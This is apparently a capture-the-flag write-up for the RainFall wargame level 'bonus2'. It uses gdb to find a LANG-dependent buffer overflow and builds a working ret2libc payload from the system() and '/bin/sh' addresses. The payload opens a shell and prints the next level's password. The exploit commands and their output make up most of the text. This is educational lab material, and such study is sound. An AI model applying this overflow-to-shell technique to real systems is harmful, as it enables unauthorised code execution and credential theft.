@@ -1,0 +1,86 @@
+Bonus2 takes 2 arguments. If not then the execution stops.
+There are 2 functions : 
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+...
+0x08048484  greetuser
+0x08048529  main
+
+During the execution with 2 valid arguments the return is "Hello + argv[1]".
+
+We try to make it segfault, but we don't have control of EIP.
+In the assembly, we found that getenv is loading the language variable.
+
+0x0804859f <+118>:	movl   $0x8048738,(%esp)
+0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
+
+x/s 0x8048738 
+0x8048738:	 "LANG"
+
+A check is made on fi which is the finnish language.
+
+0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
+0x080485cc <+163>:	mov    0x9c(%esp),%eax
+0x080485d3 <+170>:	mov    %eax,(%esp)
+0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+
+x/s 0x804873d
+0x804873d:	"fi"
+
+We will now change the env variable to see if something is changing.
+
+LANG=fi_FI.UTF-8
+
+We reexecute with the same arguments and with a pattern overflow we 
+have control of EIP with the 2nd argument at 22.
+
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "CCCC"')
+
+EIP is equal to 434343
+[ 8350.553542] bonus2[6048]: segfault at 43434343 ip 43434343 sp bffff660 error 14
+
+We are looking to get a shell, let's check if "/bin/sh" exists.
+
+(gdb) info proc map
+process 6144
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:	 "/bin/sh"
+(gdb) 
+
+It's the case. We also need the system function address:
+
+gdb) p &system
+$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
+
+We are going to send the parameters as follow :
+
+./bonus2 [BUFFER 1 of 40] [BUFFER 2 : PADDING 18 + SYSTEM ADRESS + PADDING 4 + ADRESS /bin/sh]
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x60\xb0\xe6\xb7" +"AAAA"+ "\x58\xcc\xf8\xb7"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��AAAAX���
+$ cat /home/user/bonus3/.pass 
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
